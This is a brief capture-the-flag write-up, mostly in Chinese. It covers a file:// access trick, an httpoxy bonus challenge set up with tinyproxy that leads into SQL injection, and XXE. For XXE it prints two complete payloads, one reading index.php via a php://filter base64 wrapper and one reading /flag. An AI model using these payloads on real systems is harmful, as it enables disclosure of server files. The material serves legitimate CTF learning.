# File Access
```
file://index.php
```

# XXE

讀取index.php檔案，發現 flag 不在裡面=3=
```
<!DOCTYPE root [
  <!ENTITY name SYSTEM
  "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"
  >
]>
<root>
    <result>&name;</result>
</root>
```
   
然後重讀題目發現....我眼殘 flag 在 /flag

```
<!DOCTYPE root [
  <!ENTITY name SYSTEM "file:///flag">
]>
<root>&name;</root>
```

# Bonus-httpoxy.py
這題一定要有 Proxy Server 而且要給外部訪問，可以利用手機網路，至少有實體IP   
不然AWS 或是其他 VPS 花下去，這題我把Linode 拿來用了...   

遇到一件事就是 Squid 架不起來，Google 了一下，放棄除錯改用 tinyproxy   
**然後就是SQL injection的開始**   

其實一開始用還用 id 遞增的方式下去跑 XDD   

